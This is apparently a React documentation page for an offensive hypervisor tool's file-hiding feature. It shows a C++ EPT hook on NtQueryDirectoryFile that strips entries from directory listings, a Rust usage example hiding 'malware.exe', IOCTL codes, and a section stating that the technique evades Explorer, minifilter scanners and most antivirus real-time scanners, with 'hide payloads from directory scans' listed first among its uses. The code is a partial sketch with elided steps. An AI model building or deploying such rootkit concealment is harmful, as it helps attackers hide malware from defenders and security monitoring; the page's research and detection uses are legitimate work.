import { Badge } from "@/components/ui/badge";
import { CodeBlock } from "@/components/code-block";
import { WarningBox } from "@/components/warning-box";

export default function FileHidingPage() {
  return (
    <div className="space-y-8">
      <div>
        <div className="flex items-center gap-3 mb-4">
          <h1 className="text-4xl font-bold">File Hiding</h1>
          <Badge variant="outline">Ring -1</Badge>
        </div>
        <p className="text-lg text-muted-foreground">
          Hide files and directories from filesystem enumeration using hypervisor 
          interception of directory query operations.
        </p>
      </div>

      <WarningBox variant="danger" title="System Stability">
        Hiding critical system files can cause system instability or boot failures. 
        Only hide files you have created for testing purposes.
      </WarningBox>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Overview</h2>
        <p className="text-muted-foreground">
          File hiding works by intercepting <code className="text-violet">NtQueryDirectoryFile</code> 
          and related APIs at the hypervisor level. When a directory listing is requested, 
          the hypervisor filters the results to remove entries for hidden files.
        </p>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">What Gets Hidden</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• File names in directory listings (dir, Get-ChildItem, Explorer)</li>
          <li>• File handles when opening by name</li>
          <li>• FindFirstFile/FindNextFile enumeration</li>
          <li>• NtQueryDirectoryFileEx results</li>
        </ul>
        <p className="text-muted-foreground mt-4">
          <strong>Note:</strong> Files remain accessible if the exact path is known. 
          Hiding prevents discovery, not access.
        </p>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Implementation</h2>
        <CodeBlock
          language="cpp"
          filename="Algorithm"
          code={`// Hide file via EPT hook on NtQueryDirectoryFile
NTSTATUS HvHideFile(PCWSTR FilePath) {
    // 1. Store file path in hidden files list
    AddToHiddenFilesList(FilePath);
    
    // 2. Hook NtQueryDirectoryFile via EPT (if not already hooked)
    if (!IsNtQueryDirectoryFileHooked()) {
        PVOID NtQueryDirectoryFile = GetNtoskrnlExport(
            "NtQueryDirectoryFile"
        );
        
        EptSetupHook(
            MmGetPhysicalAddress(NtQueryDirectoryFile),
            EPT_HOOK_TYPE_EXECUTE,
            NtQueryDirectoryFileHandler
        );
    }
    
    return STATUS_SUCCESS;
}

// Hook handler - filters directory query results
NTSTATUS NtQueryDirectoryFileHandler(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ...
) {
    // 1. Call original NtQueryDirectoryFile
    NTSTATUS Status = OriginalNtQueryDirectoryFile(...);
    
    // 2. If successful, filter the results
    if (NT_SUCCESS(Status)) {
        PFILE_BOTH_DIR_INFORMATION Entry = FileInformation;
        PFILE_BOTH_DIR_INFORMATION Prev = NULL;
        
        while (Entry) {
            // 3. Check if this file should be hidden
            if (IsFileHidden(Entry->FileName, Entry->FileNameLength)) {
                // 4. Unlink from results (skip this entry)
                if (Prev) {
                    Prev->NextEntryOffset += Entry->NextEntryOffset;
                } else {
                    // First entry - shift buffer or return STATUS_NO_MORE_FILES
                }
            }
            
            Prev = Entry;
            Entry = (Entry->NextEntryOffset) ? 
                (PVOID)((PUCHAR)Entry + Entry->NextEntryOffset) : NULL;
        }
    }
    
    return Status;
}`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">API</h2>
        <CodeBlock
          language="rust"
          filename="Usage"
          code={`use callback::{hv_hide_file, hv_unhide_file, hv_list_hidden_files};

// Hide a file
hv_hide_file(r"C:\\Users\\Admin\\malware.exe")?;

// Hide a directory
hv_hide_file(r"C:\\secret_folder")?;

// Hide by pattern (wildcard)
hv_hide_file(r"C:\\Temp\\*.log")?;

// List all hidden files
let hidden: Vec<String> = hv_list_hidden_files()?;

// Unhide a file
hv_unhide_file(r"C:\\Users\\Admin\\malware.exe")?;`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">IOCTLs</h2>
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 px-3 font-semibold">IOCTL</th>
                <th className="text-left py-2 px-3 font-semibold">Code</th>
                <th className="text-left py-2 px-3 font-semibold">Description</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs">HV_HIDE_FILE</td>
                <td className="py-2 px-3">0x860</td>
                <td className="py-2 px-3 text-muted-foreground">Hide file by path</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs">HV_UNHIDE_FILE</td>
                <td className="py-2 px-3">0x861</td>
                <td className="py-2 px-3 text-muted-foreground">Unhide file by path</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs">HV_LIST_HIDDEN_FILES</td>
                <td className="py-2 px-3">0x862</td>
                <td className="py-2 px-3 text-muted-foreground">List all hidden file paths</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Detection Evasion</h2>
        <p className="text-muted-foreground">
          File hiding at Ring -1 evades:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>✓ File Explorer / dir / Get-ChildItem</li>
          <li>✓ FindFirstFile/FindNextFile APIs</li>
          <li>✓ NtQueryDirectoryFile (ring 0)</li>
          <li>✓ Minifilter-based file scanners</li>
          <li>✓ Most AV real-time scanners</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Limitations</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Direct file access by exact path still works</li>
          <li>• File hashes in MFT may reveal existence</li>
          <li>• Disk forensics can find hidden files</li>
          <li>• Does not hide from other hypervisors</li>
          <li>• Performance impact on directory enumeration</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">UI Access</h2>
        <p className="text-muted-foreground">
          Access via Hypervisor tab → File Hiding section:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Enter file/directory path to hide</li>
          <li>• Supports wildcard patterns</li>
          <li>• View and manage hidden files list</li>
          <li>• One-click unhide option</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Use Cases</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Hide payloads from directory scans</li>
          <li>• Test filesystem security monitoring</li>
          <li>• Research file hiding detection methods</li>
          <li>• Demonstrate hypervisor capabilities</li>
        </ul>
      </section>
    </div>
  );
}
